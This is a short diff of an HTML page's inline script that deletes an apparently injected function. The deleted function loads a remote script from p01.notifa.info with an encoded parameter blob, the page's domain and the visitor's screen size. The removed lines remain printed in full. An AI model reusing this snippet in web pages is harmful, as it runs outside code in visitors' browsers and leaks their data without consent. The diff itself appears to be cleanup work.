@@ -5409,20 +5409,6 @@
       function sync(fn) {
         fn();
       }
-
-      function requestCfs() {
-        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
-        var idc_glo_r = Math.floor(Math.random() * 99999999999);
-        var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
-          "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2Ad9j%2bFa5ZhQvEOGlmLQ%2feTc0Onuh4Hhuhkw7oABSgV0c0qInw8F9sGTqrG83JqQrWvkwSQAhlAgTGgq5ocjsW0tzjKt69x0JZNS%2fBrZn%2f93yi%2bDz2lRTNuAHJxf0TJQ8CgskPFW%2bSG8Ts88zoh9nlOxx1YMn1pVwBgMlDhlmXpQ3d9q6Pa54ywvFcvhN9G1V7AoWLZPeOukS34Jvj7dmpvS%2f%2fZptpeIpw6aqsRQi%2bmS6T8V%2f5%2fHer6fcgdtAbitG5JPAj0V9EnpPsTPJoAZqPrHQxDLTePEwNc1uEbl6eSAasgk7QhEi6FiMT9plmaAOKfyfV55hOy4yMp0k0LsmUouMcuu7Q4rNsXnXz1dFnMRUFe9S4xgPsRxEXKV7l0IJeS%2bsYK0ZoX3jzODC18rnCgXOFVhMVWWTcUe5TmUQ1aSpRfeh923V%2fTS8vWUtOffcvpEhLrZ4so1qtVXFZC%2br5D%2fBkIFOct%2biuJ8D2AJh5C5q6pruAzQ9sg21krSKJ0cJdH7OKf7bPakdy1VD%2fQvvWA%3d%3d" +
-          "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
-        var bsa = document.createElement('script');
-        bsa.type = 'text/javascript';
-        bsa.async = true;
-        bsa.src = url;
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
-      }
-      netbro_cache_analytics(requestCfs, function() {});
     };
   </script>
 </body>
